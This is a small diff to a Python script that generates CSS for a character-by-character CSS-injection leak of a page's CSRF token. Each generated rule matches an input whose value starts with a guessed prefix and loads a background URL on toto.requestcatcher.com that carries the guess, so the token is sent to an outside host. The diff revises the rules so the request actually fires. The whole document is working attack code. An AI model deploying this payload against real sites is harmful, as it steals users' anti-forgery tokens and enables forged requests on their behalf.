@@ -6,8 +6,11 @@ css = ""
 for c in filter(str.isalnum, string.printable):
     payload = f"{prefix}{c}"
     css += f"""
-[name="csrf"][value^="{payload}"] {{
-    --value: url("https://toto.requestcatcher.com/{payload}")
+.csrf[value^="{payload}"] {{
+    --starts-with-{payload}:url("https://toto.requestcatcher.com/{payload}");
+}}
+input{{
+   background: var(--starts-with-{payload},none);
 }}
 """
 
